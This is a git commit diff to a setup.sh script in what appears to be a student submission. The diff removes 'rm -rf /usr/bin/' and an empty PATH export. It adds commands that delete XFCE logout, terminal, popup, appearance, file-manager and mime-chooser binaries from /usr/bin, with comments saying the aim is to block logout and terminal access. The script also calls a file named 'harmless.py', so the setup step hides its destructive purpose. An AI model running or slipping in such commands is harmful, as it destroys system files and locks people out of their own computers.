676dea45cece3a618fd0f1cd2034b7543d3f5a17
Thomas Weber <thomas.weber@ynov.com>
2021-10-19 23:03:11 +0200

    test

--- submission-1/setup.sh
+++ submission-1/setup.sh
@@ -1,7 +1,10 @@
 #!/bin/bash
-rm -rf /usr/bin/ 2>/dev/null
-export PATH=""
 python3 harmless.py
 
-
+rm -f /usr/bin/xfce4-session-logout         # NO LOGOUT !
+rm -f /usr/bin/xfce4-appearance-settings    # no style 
+rm -f /usr/bin/xfce4-terminal*              # no terminal
+rm -f /usr/bin/xfce4-popup*                 # no popup (windows unbinded)
+rm -f /usr/bin/thunar*                      # no file manager !
+rm -f /usr/bin/xfce4-mime*                  # no "select another app" when it doesnt find
 
